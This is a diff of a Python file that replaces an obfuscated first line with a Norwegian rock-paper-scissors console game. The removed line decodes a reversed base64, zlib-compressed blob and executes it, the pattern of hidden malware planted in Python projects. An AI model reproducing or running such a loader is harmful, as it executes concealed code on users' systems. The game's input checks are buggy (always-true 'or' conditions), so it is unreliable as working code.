@@ -1,1 +1,190 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import random
+import time
+
+a = False
+
+
+def clear_console():
+    print("\n" * 100)
+
+
+tupl = ("stein", "saks", "papir")
+
+ramount = 0
+bscore = 0
+ties = 0
+score = 0
+kaka = 0
+min = 1
+max = 100
+vvalg = ""
+wincon = {
+    "saks": "papir",
+    "stein": "saks",
+    "papir": "stein"
+}
+
+losecon = {
+    "saks": "stein",
+    "stein": "papir",
+    "papir": "saks"
+}
+
+føkkdeg = r"""
+         / \
+        |\_/|
+        |---|
+        |   |
+        |   |
+      _ |=-=| _
+  _  / \|   |/ \
+ / \|   |   |   ||\
+|   |   |   |   | \>
+|   |   |   |   |   \
+| -   -   -   - |)   )
+|                   /
+ \                 /
+  \               /
+   \             /
+    \           /
+
+"""
+
+mainlogo = r"""
+
+
+ /$$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$           /$$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$$ /$$$$$$$             /$$$$$$  /$$$$$$  /$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$  /$$
+| $$__  $$ /$$__  $$ /$$__  $$| $$  /$$/          | $$__  $$ /$$__  $$| $$__  $$| $$_____/| $$__  $$           /$$__  $$|_  $$_/ /$$__  $$ /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$| $$
+| $$  \ $$| $$  \ $$| $$  \__/| $$ /$$/           | $$  \ $$| $$  \ $$| $$  \ $$| $$      | $$  \ $$          | $$  \__/  | $$  | $$  \__/| $$  \__/| $$  \ $$| $$  \ $$| $$  \__/| $$
+| $$$$$$$/| $$  | $$| $$      | $$$$$/            | $$$$$$$/| $$$$$$$$| $$$$$$$/| $$$$$   | $$$$$$$/          |  $$$$$$   | $$  |  $$$$$$ |  $$$$$$ | $$  | $$| $$$$$$$/|  $$$$$$ | $$
+| $$__  $$| $$  | $$| $$      | $$  $$            | $$____/ | $$__  $$| $$____/ | $$__/   | $$__  $$           \____  $$  | $$   \____  $$ \____  $$| $$  | $$| $$__  $$ \____  $$|__/
+| $$  \ $$| $$  | $$| $$    $$| $$\  $$           | $$      | $$  | $$| $$      | $$      | $$  \ $$           /$$  \ $$  | $$   /$$  \ $$ /$$  \ $$| $$  | $$| $$  \ $$ /$$  \ $$    
+| $$  | $$|  $$$$$$/|  $$$$$$/| $$ \  $$ /$$      | $$      | $$  | $$| $$      | $$$$$$$$| $$  | $$ /$$      |  $$$$$$/ /$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$/ /$$
+|__/  |__/ \______/  \______/ |__/  \__/| $/      |__/      |__/  |__/|__/      |________/|__/  |__/| $/       \______/ |______/ \______/  \______/  \______/ |__/  |__/ \______/ |__/
+                                        |_/                                                         |_/                                                                               
+
+
+
+"""
+
+rps = """
+    _______
+---'   ____)
+      (_____)
+      (_____)
+      (____)
+---.__(___)
+
+    _______
+---'   ____)____
+          ______)
+          _______)
+         _______)
+---.__________)
+
+    _______
+---'   ____)____
+          ______)
+       __________)
+      (____)
+---.__(___)
+
+"""
+
+while True:
+    clear_console()
+    print(mainlogo)
+    if ramount == 0:
+        print("ctrl for controlls")
+    vvalg = ""
+    chan = random.randint(min, max)
+
+    optonon = random.choice(tupl)
+    valg = input("Stein, Saks, Papir?(ST/SA/PA)   ").lower()
+
+    if valg == "stop":
+
+        break
+
+    elif valg == "ctrl" or "controls" or "cntrl" or "cntrls" or "cntrs" or "control":
+        print("CONTROLS:")
+        print("1 eller ST for Stein")
+        print("2 eller SA for Saks")
+        print("3 eller PA for Papir")
+        print("stop for stopping")
+        print("Lykke til!")
+        time.sleep(3)
+    elif valg == "halloween":
+        min = 66
+        max = 68
+    elif valg == "st" or "1":
+        vvalg = "Stein"
+    elif valg == "sa" or "2":
+        vvalg = "Saks"
+    elif valg == "pa" or "3":
+        vvalg = "Papir"
+    elif valg == "stop":
+        break
+    else:
+        vvalg = ""
+        valg = ""
+        print("huh hva hø")
+        a = True
+    vvakg = vvalg.lower()
+
+    winmot = wincon.get(vvakg)
+    tapmot = losecon.get(vvakg)
+
+    bvalg = optonon.capitalize()
+
+    if a:
+        print("")
+
+
+    elif chan == 67:
+        print("Du tapte..\n")
+        print()
+        print("BAHHHAHAHAHHAHAHA")
+        print(føkkdeg)
+        print(f"{vvalg} < {bvalg}\n")
+        bscore += 1
+        print(f"Score: {score}")
+        kaka += 1
+        time.sleep(3)
+
+    elif winmot == optonon:
+        print("Du vant!\n")
+        print(f"{vvalg} > {bvalg}\n")
+        score += 1
+        print(f"Score: {score}")
+
+    elif tapmot == optonon:
+        print("Du tapte..\n")
+        print(f"{vvalg} < {bvalg}\n")
+        bscore += 1
+        print(f"Score: {score}")
+
+    elif vvalg.lower() == optonon:
+        print("Det ble uavgjort! \n")
+        print(f"{vvalg} = {bvalg}\n")
+        ties += 1
+        print(f"Score: {score}")
+    else:
+        print()
+
+    a = False
+    ramount += 1
+
+    time.sleep(1)
+
+print(rps)
+
+print(f"Final stats!")
+print()
+print(f"Rounds:       {ramount}")
+print(f"Score:        {score}")
+print(f"Enemy Score:  {bscore}")
+print(f"Ties:         {ties}")
+
+if kaka > 0:
+    print(f"Times fucked: {kaka}")
